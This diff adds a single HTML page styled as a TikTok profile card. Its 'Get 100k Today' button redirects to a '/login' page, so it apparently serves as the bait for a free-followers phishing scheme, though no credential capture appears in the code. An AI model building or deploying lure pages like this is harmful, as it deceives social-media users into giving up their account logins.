@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Follow Me on TikTok</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #000;
+            font-family: Arial, sans-serif;
+        }
+        .card {
+            background: #1c1c1c;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            width: 300px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f85032, #e73827);
+            padding: 5px;
+            margin: 0 auto;
+        }
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+        }
+        .profile-name {
+            margin-top: 10px;
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        .followers {
+            margin: 10px 0;
+            font-size: 1.2em;
+            color: #aaa;
+        }
+        .follow-button {
+            background: linear-gradient(45deg, #25F4EE, #FE2C55);
+            border: none;
+            border-radius: 25px;
+            padding: 10px 20px;
+            color: white;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .follow-button:hover {
+            background: linear-gradient(45deg, #FE2C55, #25F4EE);
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="avatar">
+            <img src="static/tiktok.webp" alt="Profile Avatar">
+        </div>
+        <div class="profile-name">Your Profile</div>
+        <div class="followers">300k Followers</div>
+        <button class="follow-button" onclick="login()">Get 100k Today</button>
+    </div>
+    <script>
+        function login(){
+            location.href='/login'
+        }
+    </script>
+</body>
+</html>
